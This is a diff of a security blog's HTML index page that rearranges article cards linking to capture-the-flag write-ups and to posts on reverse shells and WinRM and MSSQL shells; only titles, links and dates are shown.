-      <time lang="el">21 Ιουλ 2016</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -1357,422 +1705,32 @@ chown amrois:amrois /report/report-<span class="sb">`</span>date +%y-%m-%d:%H:%M
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fast_commit_push/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/binary_flow.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Git &amp; Mercurial: How to commit-push fast and easily</h3>
-      <h3 class="title" lang="el">Git &amp; Mercurial: Πως να κάνετε commit-push γρήγορα και εύκολα</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">17 Oct 2016</time>
-      <time lang="el">17 Οκτ 2016</time>
-    </footer>
-  </a>
-</article>
-
-           
+          
           
            
            
            
+           
           
+           
            
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Fortune write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
+      <h3 class="title" lang="en">Reverse shells</h3>
+      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">02 Aug 2019</time>
-      <time lang="el">02 Αυγ 2019</time>
+      <time lang="en">12 Apr 2018</time>
+      <time lang="el">12 Απρ 2018</time>
     </footer>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Mantis write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">18 Feb 2018</time>
-      <time lang="el">18 Φεβ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Fulcrum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">09 Jun 2018</time>
-      <time lang="el">09 Ιουν 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">27 Jul 2019</time>
-      <time lang="el">27 Ιουλ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">13 May 2018</time>
-      <time lang="el">13 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Reddish write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">26 Jan 2019</time>
-      <time lang="el">26 Ιαν 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Node write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Node</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 Mar 2018</time>
-      <time lang="el">03 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
            
           
            
@@ -1970,21 +1928,20 @@ chown amrois:amrois /report/report-<span class="sb">`</span>date +%y-%m-%d:%H:%M
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
-      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">09 Apr 2018</time>
-      <time lang="el">09 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
            
           
            
@@ -2001,21 +1958,110 @@ chown amrois:amrois /report/report-<span class="sb">`</span>date +%y-%m-%d:%H:%M
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
-      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">13 Apr 2018</time>
-      <time lang="el">13 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
            
           
            
@@ -2238,126 +2284,6 @@ chown amrois:amrois /report/report-<span class="sb">`</span>date +%y-%m-%d:%H:%M
            
            
            
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
     <div class="cell">
@@ -2384,6 +2310,77 @@ chown amrois:amrois /report/report-<span class="sb">`</span>date +%y-%m-%d:%H:%M
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
+      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Apr 2018</time>
+      <time lang="el">09 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
           
            
            
@@ -2455,20 +2452,50 @@ chown amrois:amrois /report/report-<span class="sb">`</span>date +%y-%m-%d:%H:%M
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
+  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Reverse shells</h3>
-      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
+      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
+      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">12 Apr 2018</time>
-      <time lang="el">12 Απρ 2018</time>
+      <time lang="en">13 Apr 2018</time>
+      <time lang="el">13 Απρ 2018</time>
     </footer>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
            
           
            
